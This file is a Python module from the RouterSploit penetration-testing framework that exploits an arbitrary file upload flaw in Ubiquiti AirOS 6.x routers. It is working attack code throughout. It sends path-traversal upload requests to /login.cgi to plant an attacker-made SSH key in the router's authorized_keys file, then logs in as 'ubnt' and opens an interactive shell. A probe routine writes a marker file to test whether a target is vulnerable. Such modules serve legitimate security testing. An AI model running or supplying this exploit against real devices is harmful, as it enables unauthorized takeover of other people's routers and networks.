import tempfile
from io import StringIO
import paramiko
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient
from routersploit.core.ssh.ssh_client import SSHClient


class Exploit(HTTPClient, SSHClient):
    __info__ = {
        "name": "AirOS 6.x - Arbitrary File Upload",
        "description": "Exploit implementation for AirOS 6.x - Arbitrary File Upload. "
                       "If the target is vulnerable is possible to take full control of the router.",
        "authors": (
            "93c08539",  # vulnerability discovery
            "Vinicius Henrique Marangoni",  # routersploit module
        ),
        "references": (
            "https://hackerone.com/reports/73480",
            "https://www.exploit-db.com/exploits/39701/",
        ),
        "devices": (
            "AirOS 6.x",
        )
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(443, "Target HTTP port")
    ssl = OptBool(True, "SSL enabled: true/false")

    ssh_port = OptPort(22, "Target SSH Port")

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_success("Trying to exploit by uploading SSH public key")

            key = paramiko.RSAKey.generate(1024)
            public_key = key.get_base64()
            private_key = StringIO()
            key.write_private_key(private_key)

            tmp_file_pubkey = tempfile.TemporaryFile()
            tmp_file_pubkey.write(bytes("ssh-rsa " + public_key, "utf-8"))
            tmp_file_pubkey.seek(0)

            upload_params = {"file": ("../../etc/dropbear/authorized_keys", tmp_file_pubkey, {"Expect": ""})}

            response = self.http_request(
                method="POST",
                path="/login.cgi",
                files=upload_params
            )

            if response is None:
                print_error("Exploit failed - Something was wrong while uploading the SSH Public Key")
                return

            print_success("Appareantly the exploit worked fine")
            print_success("Trying to invoke a interactive SSH Shell")

            ssh_client = self.ssh_create()
            if ssh_client.login_pkey("ubnt", private_key.getvalue()):
                ssh.interactive()

        else:
            print_error("Exploit failed - target is not vulnerable")

    @mute
    def check(self):
        response = self.http_request(
            method="GET",
            path="/login.cgi"
        )

        if response is None:
            return False  # Target not vulnerable

        rand_str = utils.random_text(16)
        mark = "vulnerable{}".format(rand_str)

        tmp_payload = tempfile.TemporaryFile()
        tmp_payload.write(mark.encode())
        tmp_payload.seek(0)

        upload_params = {"file": ("../../../../tmp/airview.uavr", tmp_payload, {"Expect": ""})}

        response = self.http_request(
            method="GET",
            path="/login.cgi",
            files=upload_params
        )

        tmp_payload.close()

        if response is None:
            return False  # Target not vulnerable

        # Response to verify if the upload was done correctly
        verify_upload = self.http_request(
            method="GET",
            path="/airview.uavr"
        )

        # Upload empty file to "clear" the airview.uavr file
        clean_tmp_file = tempfile.TemporaryFile()
        clean_tmp_file.seek(0)

        upload_params = {"file": ("../../../../tmp/airview.uavr", clean_tmp_file, {"Expect": ""})}

        self.http_request(
            method="POST",
            path="/login.cgi",
            files=upload_params
        )

        clean_tmp_file.close()

        if mark in verify_upload.text:
            return True

        return False
